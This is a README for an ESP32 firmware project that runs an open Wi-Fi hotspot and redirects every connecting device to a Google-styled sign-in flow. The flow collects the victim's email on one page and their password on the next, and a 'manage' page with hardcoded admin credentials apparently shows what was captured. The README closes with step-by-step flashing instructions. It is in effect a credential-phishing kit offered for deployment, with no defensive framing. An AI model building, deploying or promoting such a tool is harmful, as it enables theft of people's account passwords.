# ESP32 Captive Portal Google

[![Hippocratic License HL3-CL-EXTR-FFD-MEDIA-MIL-MY-SV-TAL](https://img.shields.io/static/v1?label=Hippocratic%20License&message=HL3-CL-EXTR-FFD-MEDIA-MIL-MY-SV-TAL&labelColor=5e2751&color=bc8c3d)](https://firstdonoharm.dev/version/3/0/cl-extr-ffd-media-mil-my-sv-tal.html)

## 📢 About this project
A ESP32 Captive Portal written in Arduino C++ (think airport Wi-Fi sign-in page) demo that works on all devices.

This code is an example of a captive portal for the ESP32, using the AsyncTCP library. The code sets up a soft access point with the given SSID and no password and configures a DNS server to redirect all traffic to the captive portal web server running on the ESP32. The captive portal serves an HTML page with a message that all requests will be redirected to this page.

The code also includes some workarounds and documents limitations for different devices and browsers, such as a workaround for Windows 11 captive portal and limitations on the Safari (iOS) browser.

Original Repository: <a href="https://github.com/CDFER/Captive-Portal-ESP32"><b> CDFER/Captive-Portal-ESP32 </b></a>

## 🖼️ Screenshots

<table>
  <tr>
    <th>4.3.2.1/index</th>
    <th>4.3.2.1/login</th> 
    <th>4.3.2.1/manage</th>
  </tr>
  <tr>
    <td>This is the index page. Here the user will write his email and send it.</td>
    <td>This is the password page. The user will be redirected here after posting the email.</td>
    <td>This is the settings and password page. Credentials for this page:<br><b>Login: admin <br>Password: securepassword</b></td>
  <tr>
    <td><img width="100%" src="https://raw.githubusercontent.com/Vretu-Dev/ESP32-Captive-Portal-Google/main/images/email.png" title="index"></td>
    <td><img width="100%" src="https://raw.githubusercontent.com/Vretu-Dev/ESP32-Captive-Portal-Google/main/images/password.png" title="password"></td>
    <td><img width="100%" src="https://raw.githubusercontent.com/Vretu-Dev/ESP32-Captive-Portal-Google/main/images/manage.png" title="manage"></td>
  </tr>
</table>

## ⚙️ RAM and flash memory usage

```
RAM:   [=         ]  13.8% (used 45236 bytes from 327680 bytes)
Flash: [===       ]  33.9% (used 1067117 bytes from 3145728 bytes)
```

## 👽 Installation (using PlatformIO)

1. Download and unpack the project<a href="https://github.com/Vretu-Dev/ESP32-Captive-Portal-Google/archive/refs/heads/main.zip"><b> ESP32-Captive-Portal-Google </b></a>

2. Download and install Visual Studio Code by Microsoft from [here](https://code.visualstudio.com/download)

3. Open Visual Studio Code and go to the Extensions manager (the icon with the stacked blocks in the left bar)

4. Search for "platformio" and install the PlatformIO extension.

5. In VS Code, go to File -> Open Folder... and open the folder "ESP32-Captive-Portal-Google-main" (the one that contains platformio.ini, NOT the src folder)

6. Upload firmware to the ESP32 using the right arrow button in the bottom left corner of VS Code (it takes a while for the first compile)
<img width="50%" height="50%" src="https://raw.githubusercontent.com/Vretu-Dev/ESP32-Captive-Portal-Google/main/images/firmware.png">

7. Click PlatformIO extension (the icon with the Alien in the left bar) to upload spiffs file system

8. Go to mydebug -> Platform. Click Build Filesystem Image then Upload Filesystem Image
<img width="30%" height="30%" src="https://raw.githubusercontent.com/Vretu-Dev/ESP32-Captive-Portal-Google/main/images/filesystem.png">

9. Your ESP32 is ready!